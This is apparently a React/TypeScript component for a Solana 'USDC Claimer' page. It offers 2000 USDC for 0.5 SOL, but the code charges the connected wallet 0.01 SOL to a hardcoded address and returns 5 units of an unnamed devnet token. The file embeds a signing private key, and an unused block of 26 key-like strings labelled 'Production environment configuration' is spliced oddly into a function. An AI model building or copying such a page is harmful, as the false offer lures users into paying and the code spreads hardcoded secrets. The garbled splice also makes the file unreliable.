/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5fRY6H2s4LQ5msa2DumZLVvZFNZSRofJiVezvNMTvY4j2wc7WE8moPaXwfXVip8HzPWUs7zffy26T26mnt7fdwNv"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "YgJcjVjYVoPC89FFBFkJ4DX2ycd4Y5t2tydLA8pc5JrQdE7SKp9RYfsw4s5ytJZcK41xCmv3vYLVtJKdHWdMoa2",
  "key1": "59Wm7Acge5od9cVp5RFcm2wS86LS3L4ySJB78F22PRbmGpC4uYdfFfdWRZprdgxBetGh1e8mqDMkfsCyWoTQVEVU",
  "key2": "XJWtJt1iXDVmjYRtWrnxyrXrgbmMUtZYDrHHSxHNc5FWMSQfPaJHTUUSs8dqfYTEN44pMwE1uUoJ2ysYzXndi5Z",
  "key3": "2rcCwbcob3uabdKWMY6djnaGc4BuZW2WhBSmWAWW3mehC7AtaoZkLsSXM1kg92hM7qujBLxWXwVGoHVqp2vU868m",
  "key4": "23my5tUNQhgDvTonLJjhZ3YqNv8xy9rtodvdTxVjfEiPL34ZCNYoe1freigcM6m6PgiRjFnLq52gto4AfvshoY8f",
  "key5": "61kQbh2EFGSB9sWKdF6udMHX41XG2PJr5TPbJn6oiGNG3WphQMTsCQ3byq3T5BU7uobLDohViYxrV8yREPz4YhLg",
  "key6": "58fKpUoU2ptbqGQ75XKrFNgjk8y2bCmMz8wTsnP1oM584nLKPGeSh4pvGfBvAYfoUkvPBfrJiBtx7XaNYN9BG8Uo",
  "key7": "3csSqYxMrR19Jrez1pDsQhfCgyqK8rbCRhYFUTGifWeavCYt3E1dnzvNkJTm2SUGcb9yXB1eEbA2qKgcZYWRzXXy",
  "key8": "2tcC8ru3iySPW59qmAHgPPk7GXgm6xHoBws9e4STiKZJh4k7sA68ftjUYj4tZzZPdwfi3XQdU1neaYQDzq3wbPc",
  "key9": "4wz2SgYG68SuUJ6BRSeUXk3eQdLior7Xbvc8JXzgeTFDspMcuWK5K9pEEM17HeEXWwsVZSFod21iz5pyErXHGLGE",
  "key10": "3S3BJ6MuQXzaYSxJMtf7xTHZ2q2F6vWB35jYnvmED9g1rHZnGd4Vwja9iivBP7gtCdWQswW1ynpgcQTFYZAoA9Aq",
  "key11": "4zAf5EZQ6f1TsQRQzpQwZ8WJFVgRQqCdiXLnYH5Ws4qnrJ2R5kUBQdC27HwDxz7YdFzLH1g56cQcydy5xT7QJ4nz",
  "key12": "TPDbZgC6XM84BGV9KNHSv8fL3nukk3GgF8mAEn4xiyu9zWnFwNQZsxvemYzWEd8iZt2tJtXLqgBT1Ksxx5uJU5e",
  "key13": "568CoroUStRcovn7eKHpRwUPAkaqzFqERPH4EpYUGwaGPDXpaB51Ap72sCpLyCWfuVGh9vwfoZE1pPgp2zpoL19",
  "key14": "53Ziir1s7XvNPgXpsmkSGCepeQd63CuJ2sQDiAHLzdX9H1Fp8hXDukeFyQ2Lq3vnovhKeudp8ajKUd33iG5AStX5",
  "key15": "4amXPJRPzjmkrvKZvSrsqyHxZePogbyx7nXtuetGsZ2WUW1zwMrAk1NNr9byW3KGRLCB7Xa7YTKKjTLQ6Bct2vRr",
  "key16": "4eetm9J3hesEZxAiC54wqUA9ywEsWBr8VoknWf3vVtSNtz8jFbMKJkgQjxApzhQF3pa6qWrDyTkfNXaiRwqsKeMa",
  "key17": "wLBoT5fgBCgEt98H6Ly4Ggx19SoPRYDviHtZfAeozWjjT34qAUvRswBcHAsAukpix25x8LZPEGKHENsajNs3qSG",
  "key18": "2rmJoBtQ15ST4vddLcNMs287qyXbobCy2Gmzpx59Thh9aagDWzGc9mwPKwPNNs1pakgMz7SywcBfNwxnKQrAKsE5",
  "key19": "2fNwio3AWE1FWvqZ5WpuMhfniXgPhyTrBFUeMP9FBZybiEFeqSogyANHKgywuju5K7bnxjzNd8MyPmPWVkAkfgHi",
  "key20": "5BDZUHjtGF4JYnLH2NP4EyQUY6uTKW4sHEWUKf3SUPqUzTCw6mwGLMH1BB8vRni2vjkqsxmfu8ee2JzSLN9aLDRe",
  "key21": "4aCxFydEUzFjVvhFTFUuZzndKsKrcME5mr1uhLqyihHA4KA2YXxPtVVGEsmuoLNw9MHEMVcsNbXVJ8kkNdQSE6Gn",
  "key22": "5Rzkx69avp1fuPoVQtSsdoVHAx17txK9DGDx978QEsA2R18U3fL2MrbacYDGKnriyf4y4ibWttQ93WWF2om4Kn6k",
  "key23": "cyo9eTrMudL7ukxPsLFBseVeTQuXaggXTDJjv3iXNmmYqWMMp1oUXuZki5hRBTrZSRqtTfwRnMoqQ9KwXqU847p",
  "key24": "2JwftR8bjj9xWDQrUyyjRycMgaMa3q4aJagkvPrCexuhDFmRiuFWMy51bL5QT6K28zBQeXgp69upXXvQrdtwdxV4",
  "key25": "N5zumFuXEz1dqg9Yk2Xdfou3t1ssoGXJvYQrwdAsbsoF8mZi7GWApVpS3TnL4YuVHquUwTnkfNGhkduxaqc3cgy"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
